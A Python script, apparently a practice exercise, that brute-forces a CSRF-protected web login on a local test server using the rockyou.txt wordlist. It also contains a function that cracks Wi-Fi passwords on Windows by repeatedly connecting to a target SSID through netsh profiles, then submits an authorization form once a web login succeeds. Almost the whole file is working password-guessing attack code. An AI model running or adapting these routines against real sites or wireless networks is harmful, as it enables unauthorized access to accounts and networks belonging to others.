import requests
from bs4 import BeautifulSoup
from wifi_connect import scan_networks_windows, connect_network_windows, profile_exists, run

IP =  "http://127.0.0.1:5000"

def get_csrf_token(response) -> str:
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf'})['value']
    return csrf_token

def brute_force_pass_site(api_url: str, path_weak_pass: str) -> tuple[requests.Session|None, str|None]:
    try:
        with open(path_weak_pass, 'r', encoding='utf-8') as file:
            weak_passwords = file.read().splitlines()
    except FileNotFoundError:
        raise FileNotFoundError(f"File {path_weak_pass} not found.")
    except UnicodeDecodeError:
        ValueError(f"Could not decode file {path_weak_pass}")

    # truy cập vào ip và lặp các mật khẩu để đăng nhaap
    for password in weak_passwords:
        session = requests.Session()
        response = session.get(api_url)
        csrf_token = get_csrf_token(response)
        print(csrf_token)
        data = {
            "csrf": csrf_token,
            "password": password
        }
        response = session.post(api_url, data=data)
        if response.status_code == 200:
            print(f"[+] Found valid password: {password}")
            # print(response.text)
            # print(get_csrf_token(response))
            csrf_token = get_csrf_token(response)
            return session, csrf_token
        else:
            print(f"[-] Invalid password: {password}")

    return None, None

def get_ssid_network(patern_ssid: str) -> str|None:
    """ Get name of wifi network from patern """
    networks = scan_networks_windows()
    for network in networks:
        if network["ssid"].startswith(patern_ssid):
            return network["ssid"]

    return None

def brute_force_pass_wifi(patern_ssid: str, path_weak_pass: str) -> str|None:
    try:
        with open(path_weak_pass, 'r', encoding='utf-8') as file:
            weak_passwords = file.read().splitlines()
    except FileNotFoundError:
        raise FileNotFoundError(f"File {path_weak_pass} not found.")
    except UnicodeDecodeError:
        ValueError(f"Could not decode file {path_weak_pass}")

    ssid = get_ssid_network(patern_ssid)
    if profile_exists(ssid):
        cp = run(f'netsh wlan delete profile name="{ssid}"')
        if cp.returncode != 0:
            raise RuntimeError(f"Could not delete profile {ssid}: {cp.stderr}")
    for password in weak_passwords:
        if not ssid:
            raise ValueError(f"SSID with patern {patern_ssid} not found.")
        try:
            ok = connect_network_windows(ssid, password=password)
            if ok:
                print(f"[+] Found valid password: {password}")
                return password
            else:
                print(f"[-] Invalid password: {password}")
        except Exception as e:
            print(f"[-] Error connecting with password {password}: {e}")

    return None



if __name__ == "__main__":
    api_url = f"{IP}/gate"
    path_weak_pass = "rockyou.txt"
    session, csrf_token = brute_force_pass_site(api_url, path_weak_pass)
    data = {
        "csrf": csrf_token,
        "full_name": "Nguyen Van A",
        "email": "vanduycn@gmail.com",
        "org": "ABC",
        "scope": "Full",
        "expires": "2024-12-31",
        "purpose": "Testing",
        "agree": "1"
    }
    reponse = session.post(f"{IP}/authorize", data=data)
    print(reponse.status_code)
    print(reponse.text)
    # brute_force_pass_wifi("Redmi", path_weak_pass)
    # print(get_ssid_network(patern_ssid="Room"))
